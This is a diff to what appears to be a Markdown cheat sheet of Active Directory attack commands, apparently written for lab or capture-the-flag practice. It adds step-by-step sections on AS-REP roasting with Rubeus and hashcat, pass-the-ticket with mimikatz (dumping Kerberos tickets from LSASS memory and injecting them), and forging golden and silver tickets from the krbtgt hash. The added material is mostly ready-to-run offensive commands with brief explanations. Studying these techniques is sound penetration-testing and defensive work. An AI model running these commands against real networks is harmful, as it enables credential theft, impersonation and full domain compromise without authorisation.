@@ -77,7 +77,7 @@ $ Rubeus.exe brute /password:Password1 /noticket
 - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
 ```
 
-### Kerberoasting w Rubeus & Impacket
+### Kerberoasting /w Rubeus & Impacket
 
 Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
 
@@ -109,6 +109,62 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a9edf52350a4fa9634c1b0b8e88f180a$c4a770c
 $ hashcat -m 18200 -a 0 hash.txt passwordlist.txt
 ```
 
+### AS-REP Roasting w/ Rubeus
+
+Dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
+
+```console
+windows on victim:
+
+$ Rubeus.exe asreproast
+
+Crack those Hashes /w hashcat
+(Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User)
+
+$ hashcat -m 18200 hash.txt wordlist.txt
+```
+
+### Pass the Ticket w/ mimikatz
+
+Pass the ticket works by dumping the TGT from the LSASS memory of the machine.
+
+Prepare:
+```console
+$ mimikatz.exe
+$ privilege::debug
+- Make sure the outputs says [output '20' ok]
+$ sekurlsa::tickets /export
+- this will export all of the .kirbi tickets into the directory that you are currently in
+```
+
+When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.
+
+Pass the ticket:
+
+```console
+$ kerberos::ptt <ticket>
+- ticket from preparing
+
+$ klist
+Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
+```
+
+### Golden/Silver Ticket Attack
+
+A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.
+
+```console
+$ mimikatz.exe
+$ lsadump::lsa /inject /name:krbtgt
+- To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+```
+
+Create a Golden/Silver Ticket
+
+```console
+Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
+ This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
+```
 
 ## Domain Privilege Escalation /w secretsdump.py
 
